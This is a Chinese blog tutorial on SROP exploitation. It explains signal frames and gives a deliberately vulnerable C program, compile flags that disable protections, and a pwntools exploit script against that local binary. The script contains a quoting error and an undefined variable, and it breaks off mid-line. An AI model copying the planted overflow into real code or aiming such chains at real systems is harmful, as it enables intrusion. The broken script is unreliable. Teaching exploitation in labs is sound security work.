@@ -1,0 +1,426 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SROP 基础及实战 | Yanami Security Lab</title><meta name="author" content="Anna Yanami"><meta name="copyright" content="Anna Yanami"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="先理解 Linux 如何处理信号程序运行时如果收到信号，Linux 内核大致会  暂停当前执行； 在用户栈上保存当前寄存器等上下文； 跳到信号处理函数； 信号处理函数结束后，通过 rt_sigreturn 恢复原来的上下文； 从被中断的位置继续执行。这个保存的上下文就是 signal frame。它包含了寄存器、栈指针、指令指针等信息。内核的 rt_sigreturn 会根据这个 frame 恢复">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SROP 基础及实战">
+<meta property="og:url" content="https://yanami-sec.github.io/2026/10/08/SROP%E5%9F%BA%E7%A1%80%E5%8F%8A%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:site_name" content="Yanami Security Lab">
+<meta property="og:description" content="先理解 Linux 如何处理信号程序运行时如果收到信号，Linux 内核大致会  暂停当前执行； 在用户栈上保存当前寄存器等上下文； 跳到信号处理函数； 信号处理函数结束后，通过 rt_sigreturn 恢复原来的上下文； 从被中断的位置继续执行。这个保存的上下文就是 signal frame。它包含了寄存器、栈指针、指令指针等信息。内核的 rt_sigreturn 会根据这个 frame 恢复">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yanami-sec.github.io/img/yanami16.jpg">
+<meta property="article:published_time" content="2026-10-08T01:37:44.000Z">
+<meta property="article:modified_time" content="2026-10-08T01:37:44.000Z">
+<meta property="article:author" content="Anna Yanami">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="SROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yanami-sec.github.io/img/yanami16.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SROP 基础及实战",
+  "url": "https://yanami-sec.github.io/2026/10/08/SROP%E5%9F%BA%E7%A1%80%E5%8F%8A%E5%AE%9E%E6%88%98/",
+  "image": "https://yanami-sec.github.io/img/yanami16.jpg",
+  "datePublished": "2026-10-08T01:37:44.000Z",
+  "dateModified": "2026-10-08T01:37:44.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Anna Yanami",
+      "url": "https://yanami-sec.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://yanami-sec.github.io/2026/10/08/SROP%E5%9F%BA%E7%A1%80%E5%8F%8A%E5%AE%9E%E6%88%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":800,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SROP 基础及实战',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/runtime.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/laoba.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/yanami/"><i class="fa-fw fas fa-utensils"></i><span> 八奈见食堂</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/yanami16.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Yanami Security Lab</span></a><a class="nav-page-title" href="/"><span class="site-name">SROP 基础及实战</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/yanami/"><i class="fa-fw fas fa-utensils"></i><span> 八奈见食堂</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SROP 基础及实战</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-10-08T01:37:44.000Z" title="发表于 2026-10-08 09:37:44">2026-10-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-10-08T01:37:44.000Z" title="更新于 2026-10-08 09:37:44">2026-10-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="先理解-Linux-如何处理信号"><a href="#先理解-Linux-如何处理信号" class="headerlink" title="先理解 Linux 如何处理信号"></a>先理解 Linux 如何处理信号</h2><p>程序运行时如果收到信号，Linux 内核大致会</p>
+<ol>
+<li>暂停当前执行；</li>
+<li>在用户栈上保存当前寄存器等上下文；</li>
+<li>跳到信号处理函数；</li>
+<li>信号处理函数结束后，通过 <code>rt_sigreturn</code> 恢复原来的上下文；</li>
+<li>从被中断的位置继续执行。<br>这个保存的上下文就是 signal frame。它包含了寄存器、栈指针、指令指针等信息。内核的 <code>rt_sigreturn</code> 会根据这个 frame 恢复执行状态。<br>正常程序由内核创建、使用这个 frame。SROP 则设法让程序把攻击者准备的数据当作 frame，让内核恢复攻击者指定的寄存器。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">正常流程：</span><br><span class="line">内核保存真实上下文 → 信号处理 → rt_sigreturn → 恢复真实上下文</span><br><span class="line"></span><br><span class="line">SROP 流程：</span><br><span class="line">我们伪造 signal frame → 触发 rt_sigreturn → 内核恢复我们指定的上下文</span><br></pre></td></tr></table></figure>
+<h2 id="为什么这可以控制寄存器？"><a href="#为什么这可以控制寄存器？" class="headerlink" title="为什么这可以控制寄存器？"></a>为什么这可以控制寄存器？</h2><p>在 amd64 Linux 上，<code>rt_sigreturn</code> 是一个系统调用。它会从用户栈上的 signal frame 恢复寄存器状态，包括：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAX、RDI、RSI、RDX、RSP、RIP 等</span><br></pre></td></tr></table></figure>
+<p>于是，我们可以在伪造的 frame 中安排</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RAX = 某个系统调用号</span><br><span class="line">RDI = 第一个参数</span><br><span class="line">RSI = 第二个参数</span><br><span class="line">RDX = 第三个参数</span><br><span class="line">RIP = syscall 指令地址</span><br></pre></td></tr></table></figure>
+<p>内核恢复这些值后，程序就会从指定的 <code>RIP</code> 继续执行。若那里是 <code>syscall</code>，就会发起我们安排好的系统调用。<br>这就是 SROP 能减少对 <code>pop rdi; ret</code>、<code>pop rsi; ret</code> 等 gadget 依赖的原因：它通过一次 signal frame 恢复多个寄存器。pwntools 也提供 <code>SigreturnFrame</code> 来构造这种结构。<a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/rop/srop.html">pwntools <code>SigreturnFrame</code> 文档</a></p>
+<h2 id="系统调用和普通函数调用的区别"><a href="#系统调用和普通函数调用的区别" class="headerlink" title="系统调用和普通函数调用的区别"></a>系统调用和普通函数调用的区别</h2><p>ORW 中的 <code>open</code>、<code>read</code>、<code>write</code> 可以作为 libc 函数调用，也可以直接发起 Linux 系统调用。SROP 教程通常选择直接做系统调用。<br>amd64 Linux 系统调用约定是</p>
+<table>
+<thead>
+<tr>
+<th>内容</th>
+<th>寄存器</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>系统调用号</td>
+<td><code>rax</code></td>
+</tr>
+<tr>
+<td>第 1 个参数</td>
+<td><code>rdi</code></td>
+</tr>
+<tr>
+<td>第 2 个参数</td>
+<td><code>rsi</code></td>
+</tr>
+<tr>
+<td>第 3 个参数</td>
+<td><code>rdx</code></td>
+</tr>
+<tr>
+<td>第 4 个参数</td>
+<td><code>r10</code></td>
+</tr>
+<tr>
+<td>第 5 个参数</td>
+<td><code>r8</code></td>
+</tr>
+<tr>
+<td>第 6 个参数</td>
+<td><code>r9</code></td>
+</tr>
+</tbody></table>
+<p>常用系统调用号</p>
+<table>
+<thead>
+<tr>
+<th>系统调用</th>
+<th><code>rax</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>read</code></td>
+<td>0</td>
+</tr>
+<tr>
+<td><code>write</code></td>
+<td>1</td>
+</tr>
+<tr>
+<td><code>open</code></td>
+<td>2</td>
+</tr>
+<tr>
+<td><code>rt_sigreturn</code></td>
+<td>15</td>
+</tr>
+<tr>
+<td><code>execve</code></td>
+<td>59</td>
+</tr>
+</tbody></table>
+<p>系统调用约定和普通函数调用约定不完全一样。比如普通函数的第四个参数使用 <code>rcx</code>，但 Linux amd64 系统调用的第四个参数使用 <code>r10</code>。</p>
+<h2 id="SROP-利用通常需要什么"><a href="#SROP-利用通常需要什么" class="headerlink" title="SROP 利用通常需要什么"></a>SROP 利用通常需要什么</h2><p>最基本的 SROP 通常需要</p>
+<ul>
+<li>一个 <code>syscall</code> 指令；</li>
+<li>能控制栈内容和执行流程的漏洞；</li>
+<li>能让 <code>rax</code> 变成 <code>15</code> 的办法；</li>
+<li>一份按目标架构布局正确的 signal frame。<br>典型触发逻辑可以理解为</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">控制 RIP 到 syscall</span><br><span class="line">设置 RAX = 15，也就是 rt_sigreturn</span><br><span class="line">        ↓</span><br><span class="line">执行 syscall</span><br><span class="line">        ↓</span><br><span class="line">内核从栈上的伪造 frame 恢复寄存器</span><br><span class="line">        ↓</span><br><span class="line">RIP 跳到 frame 指定的地址</span><br></pre></td></tr></table></figure>
+<p>有时程序中本来就有 <code>syscall; ret</code>，也可能需要先通过 <code>read</code> 等方式控制 <code>rax</code>。具体链条取决于题目提供了什么指令和漏洞。</p>
+<h2 id="用-SROP-做一次-ORW"><a href="#用-SROP-做一次-ORW" class="headerlink" title="用 SROP 做一次 ORW"></a>用 SROP 做一次 ORW</h2><p>拿你刚学完的 ORW 举例。一个 frame 可以安排成直接执行 <code>read</code> 系统调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RAX = 0          # SYS_read</span><br><span class="line">RDI = 0          # stdin</span><br><span class="line">RSI = buffer     # 缓冲区</span><br><span class="line">RDX = 0x100      # 读取长度</span><br><span class="line">RIP = syscall 地址</span><br></pre></td></tr></table></figure>
+<p>系统调用完成后，还可以准备下一份 frame，让程序执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RAX = 1          # SYS_write</span><br><span class="line">RDI = 1          # stdout</span><br><span class="line">RSI = buffer</span><br><span class="line">RDX = 实际或指定长度</span><br><span class="line">RIP = syscall 地址</span><br></pre></td></tr></table></figure>
+<p>因此，SROP 和 ORW 可以组合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">伪造 frame → read(0, buffer, size)</span><br><span class="line">伪造 frame → write(1, buffer, size)</span><br></pre></td></tr></table></figure>
+<p>这和普通 ROP 的目标相同，区别在于寄存器是通过 signal frame 一次性恢复出来的。</p>
+<h2 id="SigreturnFrame-是什么"><a href="#SigreturnFrame-是什么" class="headerlink" title="SigreturnFrame 是什么"></a><code>SigreturnFrame</code> 是什么</h2><p>pwntools 的 <code>SigreturnFrame</code> 会按照指定架构生成 signal frame。我们可以像设置对象属性一样填写寄存器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = 0          # SYS_read</span><br><span class="line">frame.rdi = 0</span><br><span class="line">frame.rsi = 0x404800   # 示例缓冲区地址</span><br><span class="line">frame.rdx = 0x100</span><br><span class="line">frame.rip = 0x401234   # 示例 syscall 指令地址</span><br></pre></td></tr></table></figure>
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = bytes(frame)</span><br></pre></td></tr></table></figure>
+<p>实际 frame 大小和布局与架构、pwntools 版本有关，不要手工假定固定长度；可以检查</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(len(bytes(frame)))</span><br></pre></td></tr></table></figure>
+<p><code>SigreturnFrame</code> 的作用是帮我们正确序列化 frame。它不会自动找到漏洞、控制 <code>rax=15</code>，也不会自动让程序执行 <code>syscall</code>；这些仍然要靠题目里的漏洞和指令完成。</p>
+<h2 id="先记住这条主线"><a href="#先记住这条主线" class="headerlink" title="先记住这条主线"></a>先记住这条主线</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">控制程序到 syscall 指令</span><br><span class="line">        ↓</span><br><span class="line">令 RAX = 15，触发 rt_sigreturn</span><br><span class="line">        ↓</span><br><span class="line">内核读取伪造的 signal frame</span><br><span class="line">        ↓</span><br><span class="line">恢复 frame 中指定的寄存器</span><br><span class="line">        ↓</span><br><span class="line">跳到 frame 中的 RIP</span><br><span class="line">        ↓</span><br><span class="line">执行目标系统调用</span><br></pre></td></tr></table></figure>
+<p>SROP 不是另一种 ORW。它是<strong>设置寄存器和控制执行状态的一种方式</strong>；ORW 是要完成的文件操作目标。两者可以组合起来。<br>下一步适合做一个很小的本地练习：程序提供栈溢出和 <code>syscall</code> 指令，我们先用一份 SROP frame 调用 <code>write(1, message, length)</code>，确认理解了“触发 sigreturn → 恢复寄存器 → 执行 syscall”这三个环节，再扩展到 SROP-ORW。</p>
+<p>好，进入实战第一步：先用 SROP 控制寄存器，调用一次 <code>write(1, message, length)</code>。这题暂时不做 ORW，先验证 signal frame 能不能让内核恢复我们指定的寄存器。</p>
+<h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p>保存为 <code>srop_write.c</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;SROP works!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">__attribute__((naked, used))</span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget_pop_rax</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;pop %rax\n\tret&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((naked, used))</span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget_syscall_ret</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;syscall\n\tret&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里明确提供了两个 gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rax; ret</span><br><span class="line">syscall; ret</span><br></pre></td></tr></table></figure>
+<p>第一个负责把 <code>rax</code> 设为 <code>15</code>，第二个执行系统调用。<code>message</code> 是程序里的全局字符串，利用时可以直接取它的地址。</p>
+<h2 id="编译运行"><a href="#编译运行" class="headerlink" title="编译运行"></a>编译运行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc srop_write.c -o srop_write \</span><br><span class="line">    -fno-stack-protector \</span><br><span class="line">    -fno-pie -no-pie \</span><br><span class="line">    -Wl,-z,norelro</span><br></pre></td></tr></table></figure>
+<p>确认保护和 gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checksec ./srop_write</span><br><span class="line">nm -n ./srop_write | grep -E &#x27;message|gadget&#x27;</span><br></pre></td></tr></table></figure>
+<p>安装 pwntools 后，确认它支持 amd64 的 <code>SigreturnFrame</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;from pwn import *; context.arch=&#x27;amd64&#x27;; f=SigreturnFrame(); print(len(bytes(f)))&quot;</span><br></pre></td></tr></table></figure>
+<p>frame 的长度由 pwntools 按架构和实现生成，脚本里不要手写长度。<br><img src="/img/mainbackground/srop-01.png" alt="image"></p>
+<h2 id="要构造的执行流程"><a href="#要构造的执行流程" class="headerlink" title="要构造的执行流程"></a>要构造的执行流程</h2><p>amd64 Linux 上 <code>rt_sigreturn</code> 的系统调用号是 <code>15</code>。payload 的结构是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">填充到返回地址</span><br><span class="line">pop rax; ret</span><br><span class="line">15</span><br><span class="line">syscall; ret</span><br><span class="line">伪造的 SigreturnFrame</span><br></pre></td></tr></table></figure>
+
+<p>执行到 <code>syscall; ret</code> 时，<code>rax=15</code>，内核会把栈上的内容当作 signal frame，恢复其中的寄存器。我们要在 frame 中设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax = 1              # SYS_write</span><br><span class="line">rdi = 1              # 标准输出</span><br><span class="line">rsi = message 地址</span><br><span class="line">rdx = message 长度</span><br><span class="line">rip = syscall; ret 地址</span><br></pre></td></tr></table></figure>
+<p>恢复完成后，CPU 到达 <code>syscall; ret</code>，这次 <code>rax=1</code>，于是执行 <code>write(1, message, length)</code>。</p>
+<h2 id="利用脚本骨架"><a href="#利用脚本骨架" class="headerlink" title="利用脚本骨架"></a>利用脚本骨架</h2><p>把偏移和 gadget 地址从你编译出的程序里取出来，再补全脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64,os = &#x27;</span>linux<span class="string">&#x27;,log_level = &#x27;</span>debug<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">elf = ELF(&#x27;</span>./srop_write<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">io = process(elf.path)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">offset = 72  # 用 cyclic / GDB 测出</span></span><br><span class="line"><span class="string">pop_rax = elf.sym[&#x27;</span>gadget_pop_rax<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">syscall_ret = elf.sym[&#x27;</span>gadget_syscall_re<span class="string">t&#x27;]</span></span><br><span class="line"><span class="string">message_addr = elf.sym[&#x27;</span>message<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">message_len = len(b&#x27;</span>SROP works!\n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">frame = SigreturnFrame()</span></span><br><span class="line"><span class="string">frame.rax = 1</span></span><br><span class="line"><span class="string">frame.rdi = 1</span></span><br><span class="line"><span class="string">frame.rsi = message_addr</span></span><br><span class="line"><span class="string">frame.rdx = message_len</span></span><br><span class="line"><span class="string">frame.rip = syscall_ret</span></span><br><span class="line"><span class="string">payload = flat(</span></span><br><span class="line"><span class="string">    b&#x27;</span>A<span class="string">&#x27; * offset,</span></span><br><span class="line"><span class="string">    pop_rax,</span></span><br><span class="line"><span class="string">    15,           </span></span><br><span class="line"><span class="string">    syscall_ret,</span></span><br><span class="line"><span class="string">    bytes(frame)</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">q.sendlineafter(b&#x27;</span>Input:\n<span class="string">&#x27;, 